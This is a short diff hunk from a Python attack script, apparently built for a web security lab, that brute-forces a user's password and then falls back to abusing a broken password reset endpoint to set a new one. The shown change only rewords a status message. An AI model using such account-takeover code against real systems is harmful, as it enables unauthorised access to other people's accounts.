@@ -45,7 +45,7 @@ def try_brute_force(user="carlos", filename="passwords.txt", base_url=DEFAULT_BA
 
 def run_reset_password(user="carlos", new_pwd="123123", base_url=DEFAULT_BASE):
     reset_url = base_url + "reset_password.php"
-    print(f"\n[*] Step 2: Falling back to Broken Password Reset...")
+    print(f"\n[*] Step 2: Falling to Broken Password Reset...")
     params = {'user': user}
     data = {'new_password': new_pwd}
     
